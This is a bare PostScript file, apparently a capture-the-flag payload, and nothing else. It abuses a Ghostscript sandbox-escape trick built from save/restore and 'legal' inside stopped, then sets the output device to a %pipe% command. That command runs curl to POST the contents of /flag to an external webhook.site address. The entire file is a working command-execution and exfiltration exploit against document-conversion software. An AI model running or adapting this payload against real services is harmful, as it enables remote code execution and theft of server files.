%!PS
%%BoundingBox: 0 0 74 35

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%curl -X POST https://webhook.site/9ef35d63-cd74-42da-ad5c-7e1f57cd7395 -d "`cat /flag`") currentdevice putdeviceprops
showpage
